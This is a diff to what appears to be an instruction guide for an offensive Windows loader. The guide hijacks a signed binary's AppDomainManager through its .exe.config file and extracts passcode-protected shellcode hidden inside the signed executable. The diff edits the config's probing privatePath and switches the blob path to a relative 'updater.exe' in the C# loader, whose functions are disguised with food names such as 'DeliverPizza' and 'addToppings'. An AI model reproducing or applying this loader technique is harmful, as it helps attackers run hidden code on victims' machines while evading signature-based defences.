@@ -43,10 +43,14 @@ Run the following command to get a windows signed binary (you can change the nam
 ```
   
 
-Open updater.exe.config and change the value of updater and A54IPK:
+Open updater.exe.config and change the value of updater and A54IPK. Change the value of privatePath to a relative path (using . should work fine):
 
 
 ```  
+
+              <probing privatePath="."/>
+
+      </assemblyBinding>
 
   <appDomainManagerAssembly value="updater, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />  
 
@@ -62,12 +66,12 @@ Remove all comments and debug lines.
 
 Change the value of “public sealed class A54IPK” to match you config file
 
-Change the value of the below two lines to match the location of your exe and the passcode used to create it:
+Change the value of the below two lines to match the location of your exe (don't use an absolute path! Has to be a relative path.) and the passcode used to create it:
 
 
 ```  
 
-byte[] _peBlob = Read("C:\\Users\\Administrator\\Desktop\\iUpdater\\updater.exe");
+byte[] _peBlob = Read("updater.exe");
 
 byte[] _data = FindRecipe(shellcode, “passcode”);
 ```
@@ -296,7 +300,7 @@ public class LunchMenu
 
 	public static bool DeliverPizza()
 	{
-        byte[] _peBlob = Read("C:\\Users\\Administrator\\Desktop\\good_updater\\updater.exe");
+        byte[] _peBlob = Read("updater.exe");
         int _dataOffset = addToppings(_peBlob, _tag);
 
         Stream stream = new MemoryStream(_peBlob);
